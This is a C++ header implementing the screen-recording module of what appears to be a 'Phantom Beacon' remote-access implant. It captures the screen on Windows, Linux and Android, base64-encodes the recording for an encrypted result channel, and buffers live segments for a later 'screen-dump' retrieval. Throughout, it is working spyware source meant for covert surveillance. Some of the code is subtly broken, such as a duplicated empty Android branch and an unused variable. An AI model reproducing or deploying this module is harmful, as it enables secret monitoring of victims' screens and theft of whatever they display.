#pragma once
// ============================================================================
//  screen_record.h — Phantom Beacon Screen Recording Module (Cross-Platform)
//  ─────────────────────────────────────────────────────
//  Supports two modes:
//    - Passive:  Record for duration_seconds, return base64-encoded file
//    - Live:     Stream H.264 frames as base64 chunks for real-time viewing
//  ──────────────────────────────
//  Windows: ffmpeg with gdigrab / Desktop Duplication
//  Linux:   ffmpeg with x11grab / wf-rec (Wayland) / gst-launch
//  Android: screenrecord
// ============================================================================

#include "media_utils.h"
#ifdef _WIN32
#include "jpeg_enc.h"
#include <windows.h>
#endif
#include <string>
#include <cstdlib>
#include <sstream>

namespace media_screen {

// ── Passive Mode: record then return file ───────────────────────────────────

inline std::string record_screen_passive(int duration_seconds) {
    if (duration_seconds <= 0) duration_seconds = 5;
    std::string tmp_file = media_utils::join_path(media_utils::get_temp_path(), "phantom_rec.mp4");

#ifdef _WIN32
    // ── Native capture: GDI frames → JPEG via GDI+ (no external tools) ──
    // Frame container: "PHREC" + u32 count, then per frame:
    //   u32 timestamp_ms + u32 jpeg_len + jpeg bytes
    // ~2 fps keeps 5 s of 1536x864 activity around 1.5 MB — small enough
    // for the encrypted result channel while showing real interaction.
    {
        const int fps = 2;
        const int total_frames = duration_seconds * fps;
        HDC hScreenDC = GetDC(nullptr);
        if (!hScreenDC) return "SCREEN_RECORD_ERROR: GetDC failed";
        int w = GetDeviceCaps(hScreenDC, HORZRES);
        int h = GetDeviceCaps(hScreenDC, VERTRES);
        HDC hMemDC = CreateCompatibleDC(hScreenDC);
        HBITMAP hBmp = CreateCompatibleBitmap(hScreenDC, w, h);
        HGDIOBJ hOld = SelectObject(hMemDC, hBmp);

        DWORD t0 = GetTickCount();
        std::ostringstream meta;
        meta << "PHREC";
        std::string frames;
        int encoded = 0;
        for (int i = 0; i < total_frames; ++i) {
            BitBlt(hMemDC, 0, 0, w, h, hScreenDC, 0, 0, SRCCOPY);
            std::vector<BYTE> jpg;
            if (jpegenc::encode_hbitmap(hBmp, 45, jpg) && jpg.size() > 128) {
                DWORD ts = GetTickCount() - t0;
                frames.append(reinterpret_cast<const char*>(&ts), sizeof(ts));
                uint32_t len = static_cast<uint32_t>(jpg.size());
                frames.append(reinterpret_cast<const char*>(&len), sizeof(len));
                frames.append(reinterpret_cast<const char*>(jpg.data()), jpg.size());
                ++encoded;
            }
            Sleep(1000 / fps);
        }
        SelectObject(hMemDC, hOld);
        DeleteObject(hBmp);
        DeleteDC(hMemDC);
        ReleaseDC(nullptr, hScreenDC);

        if (encoded == 0) {
            return "SCREEN_RECORD_ERROR: GDI+ JPEG encoding failed";
        }
        std::string body = frames;
        uint32_t cnt = static_cast<uint32_t>(encoded);
        std::string header = std::string("PHREC") +
            std::string(reinterpret_cast<const char*>(&cnt), sizeof(cnt));
        // Prepend header after encoding (frames built in a separate buffer).
        std::string payload = header + body;
        // Clean up any stale temp file from previous external-tool runs.
        if (media_utils::file_exists(tmp_file)) {
            DeleteFileA(tmp_file.c_str());
        }
        return "SCREENREC_B64:" + crypto::base64_encode(
            std::vector<BYTE>(payload.begin(), payload.end()));
    }
#elif defined(__ANDROID__) || defined(ANDROID)

#elif defined(__ANDROID__) || defined(ANDROID)
    // Android: screenrecord
    std::string cmd = "screenrecord --time-limit " + std::to_string(duration_seconds) + " " + tmp_file + " 2>/dev/null";
    int ret = system(cmd.c_str());
    if (ret == 0 && media_utils::file_exists(tmp_file)) {
        return media_utils::read_file_b64(tmp_file);
    }
    return "SCREEN_RECORD_ERROR: screenrecord failed\n";

#else
    // Linux: try ffmpeg with x11grab
    std::string ffmpeg = media_utils::exec_cmd("which ffmpeg 2>/dev/null");
    if (!ffmpeg.empty()) {
        std::string cmd = "ffmpeg -f x11grab -i :0.0 -t " + std::to_string(duration_seconds) +
                          " -y -vf scale=320:-1 " + tmp_file + " 2>/dev/null";
        int ret = system(cmd.c_str());
        if (ret == 0 && media_utils::file_exists(tmp_file)) {
            return media_utils::read_file_b64(tmp_file);
        }
    }

    // Try wf-rec for Wayland
    std::string wfrec = media_utils::exec_cmd("which wf-rec 2>/dev/null");
    if (!wfrec.empty()) {
        std::string cmd = "timeout " + std::to_string(duration_seconds) + "s wf-rec -g \"$(slurp 2>/dev/null)\" " + tmp_file + " 2>/dev/null";
        int ret = system(cmd.c_str());
        if (ret == 0 && media_utils::file_exists(tmp_file)) {
            return media_utils::read_file_b64(tmp_file);
        }
    }

    // Try GStreamer
    std::string gst = media_utils::exec_cmd("which gst-launch-1.0 2>/dev/null");
    if (!gst.empty()) {
        std::string cmd = "timeout " + std::to_string(duration_seconds) + "s gst-launch-1.0 ximagesrc ! videoconvert ! vp8enc ! matroskamux ! filesink location=" + tmp_file + " 2>/dev/null";
        int ret = system(cmd.c_str());
        if (ret == 0 && media_utils::file_exists(tmp_file)) {
            return media_utils::read_file_b64(tmp_file);
        }
    }

    return "SCREEN_RECORD_ERROR: No screen recorder available (ffmpeg, wf-rec, or gst-launch)\n";
#endif
}

// ── Live Mode: stream frames as base64 chunks ────────────────────────────────
// Returns: "SCREEN_LIVE:<b64_chunk_1>|<b64_chunk_2>|..."
// The segments are KEPT on disk (buffered) so that a later
// `screen-dump` can retrieve the full accumulated recording.
// A new live session wipes the previous buffer first.

inline std::string record_screen_live(int duration_seconds) {
    if (duration_seconds <= 0) duration_seconds = 5;
    std::string tmp_dir = media_utils::get_temp_path();
    std::string tmp_base = media_utils::join_path(tmp_dir, "phantom_live_rec");

#ifdef _WIN32
    // Wipe any stale buffered segments before starting a new session
    system((std::string("del /q \"") + tmp_base + ".*\" >nul 2>nul").c_str());

    std::string ffmpeg = media_utils::exec_cmd("where ffmpeg 2>nul");
    if (!ffmpeg.empty()) {
        std::string cmd = "ffmpeg -f gdigrab -i desktop -t " + std::to_string(duration_seconds) +
                          " -y -f segment -segment_time 5 -reset_timestamps 1 " + tmp_base + ".%03d 2>nul";
        system(cmd.c_str());

        // Read all chunks and return as pipe-separated base64
        std::string chunks = "SCREEN_LIVE:";
        for (int i = 0; i < 999; i++) {
            char chunk_path[512];
            snprintf(chunk_path, sizeof(chunk_path), "%s.%03d", tmp_base.c_str(), i);
            if (media_utils::file_exists(chunk_path)) {
                std::string b64 = media_utils::read_file_b64(chunk_path);
                if (!b64.empty()) {
                    if (chunks != "SCREEN_LIVE:") chunks += "|";
                    chunks += b64.substr(10); // Strip "MEDIA_B64:" prefix
                }
                // NOTE: chunk is kept on disk for later screen-dump
            } else {
                break;
            }
        }
        if (chunks != "SCREEN_LIVE:") return chunks;
    }

    return "SCREEN_LIVE_ERROR: ffmpeg not available for live streaming\n";

#elif defined(__ANDROID__) || defined(ANDROID)
    // Android doesn't support real-time streaming easily via shell
    // Return passive recording as fallback
    return record_screen_passive(duration_seconds);

#else
    // Wipe any stale buffered segments before starting a new session
    system(("rm -f " + tmp_base + ".* 2>/dev/null").c_str());

    std::string ffmpeg = media_utils::exec_cmd("which ffmpeg 2>/dev/null");
    if (!ffmpeg.empty()) {
        std::string cmd = "ffmpeg -f x11grab -i :0.0 -t " + std::to_string(duration_seconds) +
                          " -y -f segment -segment_time 5 -reset_timestamps 1 " + tmp_base + ".%03d 2>/dev/null";
        system(cmd.c_str());

        std::string chunks = "SCREEN_LIVE:";
        for (int i = 0; i < 999; i++) {
            char chunk_path[512];
            snprintf(chunk_path, sizeof(chunk_path), "%s.%03d", tmp_base.c_str(), i);
            std::string chunk_path_str(chunk_path);
            if (media_utils::file_exists(chunk_path_str)) {
                std::string b64 = media_utils::read_file_b64(chunk_path_str);
                if (!b64.empty()) {
                    if (chunks != "SCREEN_LIVE:") chunks += "|";
                    chunks += b64.substr(10);
                }
                // NOTE: chunk is kept on disk for later screen-dump
            } else {
                break;
            }
        }
        if (chunks != "SCREEN_LIVE:") return chunks;
    }

    return "SCREEN_LIVE_ERROR: ffmpeg not available for live streaming\n";
#endif
}

// ── Dump: retrieve buffered live recording ────────────────────────────────────
// Returns the full accumulated recording as a single base64 blob.
// The buffered segments are deleted after a successful concatenation.

inline std::string dump_live_recording() {
    std::string tmp_dir = media_utils::get_temp_path();
    std::string pattern = media_utils::join_path(tmp_dir, "phantom_live_rec.*");
    std::string tmp_base = media_utils::join_path(tmp_dir, "phantom_live_rec");

    std::string all_files;
#ifdef _WIN32
    all_files = media_utils::exec_cmd("dir /b \"" + pattern + "\" 2>nul");
#else
    all_files = media_utils::exec_cmd("ls " + pattern + " 2>/dev/null");
#endif
    if (all_files.empty()) {
        return "SCREEN_DUMP:No buffered recording found";
    }

    // Concatenate all segments
    std::string concat_file = media_utils::join_path(tmp_dir, "phantom_dump_concat.mp4");
#ifdef _WIN32
    std::string cat_cmd = "copy /b \"" + tmp_base + ".*\" \"" + concat_file + "\" >nul 2>nul";
#else
    std::string cat_cmd = "cat " + pattern + " > " + concat_file + " 2>/dev/null";
#endif
    system(cat_cmd.c_str());

    std::string result = "SCREEN_DUMP:";
    if (media_utils::file_exists(concat_file)) {
        result += media_utils::read_file_b64(concat_file).substr(10);
        // Cleanup: the dump is a one-shot retrieval
#ifdef _WIN32
        system(("del /q \"" + pattern + "\" \"" + concat_file + "\" >nul 2>nul").c_str());
#else
        system(("rm -f " + pattern + " " + concat_file + " 2>/dev/null").c_str());
#endif
    } else {
        result += "ERROR: Failed to concatenate segments";
    }

    return result;
}

} // namespace media_screen
